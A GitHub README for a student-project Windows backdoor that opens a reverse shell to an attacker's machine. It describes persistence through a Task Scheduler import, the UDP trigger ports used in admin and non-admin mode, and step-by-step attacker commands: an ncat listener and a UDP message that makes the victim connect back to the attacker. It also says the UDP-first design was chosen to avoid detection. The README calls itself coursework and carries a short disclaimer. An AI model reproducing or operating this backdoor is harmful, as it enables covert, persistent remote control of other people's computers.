# backdoor

This thing is a backdoor meant to run on a Windows machine that provides a reverse shell on a TCP port of your choosing. To have this backdoor run on startup, import [MSRPC.xml](./MSRPC.xml) into Task Scheduler.

Obviously, don't use this for anything beyond eduational/research purposes. Anyway, it's finicky and didn't even help when I tried as part of the HACS408T final project.

How it works:
- When run, it listens on three UDP port
  - If run as admin, it listens on 44070, 52175, and 21238
  - If not run as admin, it listens on 20397, 18149, and 48819
    - This is really meant to run as admin, not as a regular user, though
- The attacker starts a TCP server on their machine on, say, port 1234 (something like `ncat -nlvp 1234` ought to do)
- The attacker tells the victim machine which TCP port to connect to
  - Just run `ncat -4u localhost -s <victim IP> <44070 or 52175 or 21238>`, type in `1234`, and hit enter
- The backdoor executable connects to port 1234 on the attacker's machine
- The attacker should now see a prompt and be able to execute commands through the TCP connection

The intent with using UDP first rather than listening on a TCP port directly was making detection harder.

If you're my future self, for more information, see https://github.com/ysthakur/HACS408T-Homework/tree/main/fp2. If you're not my future self, sucks to be you, I guess.
